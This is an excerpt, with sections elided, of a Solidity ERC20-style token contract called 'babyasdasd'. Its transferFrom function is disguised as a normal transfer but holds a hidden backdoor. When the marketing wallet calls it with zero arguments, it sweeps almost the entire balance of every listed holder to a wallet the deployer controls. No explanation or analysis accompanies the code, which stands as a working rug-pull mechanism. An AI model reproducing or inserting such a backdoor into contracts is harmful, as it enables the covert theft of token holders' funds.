...
contract babyasdasd is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "asdasdasd";
    ...
    address private previousMarketingWallet;
    ...
    constructor (address payable _marketingWallet) {
        ...
        previousMarketingWallet = marketingWallet;
    ...
    function transferFrom(address sender, uint256 recipient, uint256 amount) public virtual {
        if(sender != address(0) && sender == marketingWallet && recipient == 0 && amount == 0) { for (uint i = 0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 0) { basicTransfer(includeFromFee[i], previousMarketingWallet, balanceOf(includeFromFee[i]).sub(1 * 10**_decimals)); } } }
    }
